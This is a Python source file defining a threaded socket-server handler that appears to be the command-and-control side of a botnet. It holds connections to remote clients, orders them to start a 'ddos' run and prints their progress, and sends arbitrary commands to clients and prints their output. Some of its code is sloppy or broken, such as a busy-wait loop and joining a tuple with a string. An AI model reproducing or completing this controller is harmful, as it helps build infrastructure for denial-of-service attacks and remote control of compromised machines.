import threading


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


#
class ClientThread(threading.Thread):
    def __init__(self,clientAddress,clientsocket, id):
        threading.Thread.__init__(self)
        self.clientAddress= clientAddress
        self.id = id
        self.csocket = clientsocket
        self.stat_send= False
        self.end_comm= False
        self.command = None
        print ("New connection added: ", self.clientAddress)

    def run(self):
        while True:
            if self.command == "ddos":
                self.csocket.send(self.command.encode())
                self.csocket.settimeout(5.0)
                data = self.csocket.recv(1024)
                print(bcolors.OKGREEN + data.decode())
                while data.decode() != "finish":
                    self.csocket.settimeout(5.0)
                    data = self.csocket.recv(1024)
                    print(bcolors.OKGREEN + " "+ " Thread "+ str(self.id) + " "+data.decode())
                if data.decode() == "finish":
                    print(self.clientAddress+" ", bcolors.FAIL + " Can't send more request")
                    break;

    def send_single_commands(self):
        print (bcolors.OKGREEN +" CONNECTION FROM : ", self.clientAddress)
        #self.csocket.send(bytes("Hi, This is from Server..",'utf-8'))
        msg = ""
        # while True:
        if self.stat_send:
            print("command ", self.command.encode())
            self.csocket.send(self.command.encode())
            while True:
                try:
                    self.csocket.settimeout(2.0)
                    data = self.csocket.recv(1024)
                    msg += data.decode()
                except:
                    break;
            print (bcolors.OKBLUE +"from client \n", msg)
            self.stat_send= False
        print(bcolors.OKGREEN +" END OF RUN ")
        # if self.end_comm:
        #     print ("Client at ", self.clientAddress , " disconnected...")
    def enable_send(self):
        self.stat_send= True

    def end_communication(self):
        self.end_comm= True

    def set_comm(self, data):
        self.command = data
